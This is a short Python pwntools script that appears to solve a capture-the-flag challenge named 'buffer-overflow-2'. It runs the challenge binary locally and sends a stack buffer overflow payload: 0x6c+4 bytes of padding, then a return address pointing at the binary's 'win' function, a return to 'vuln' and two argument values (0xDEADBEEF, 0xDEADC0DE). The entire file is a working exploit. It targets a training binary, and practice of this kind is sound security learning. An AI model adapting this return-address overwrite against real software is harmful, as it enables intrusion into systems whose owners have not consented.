#! /usr/bin/env python
#
from pwn import *
context.clear(arch='i386', os='linux', endian='little', word_size=32)


class ExploitInfo:
    name    = '/problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa/vuln'
    elf     = ELF(name)
    #
    offset_buf_to_eip = 0x6c + 4


def main():
    p = process(ExploitInfo.name)

    rop = p32(ExploitInfo.elf.symbols['win'])
    rop += p32(ExploitInfo.elf.symbols['vuln'])
    rop += p32(0xDEADBEEF)
    rop += p32(0xDEADC0DE)
    log.info(rop)

    payload = 'A' * ExploitInfo.offset_buf_to_eip
    payload += rop
    p.clean()
    p.sendline(payload)

    log.info(p.recv(4096))


if __name__ == "__main__":
    main()
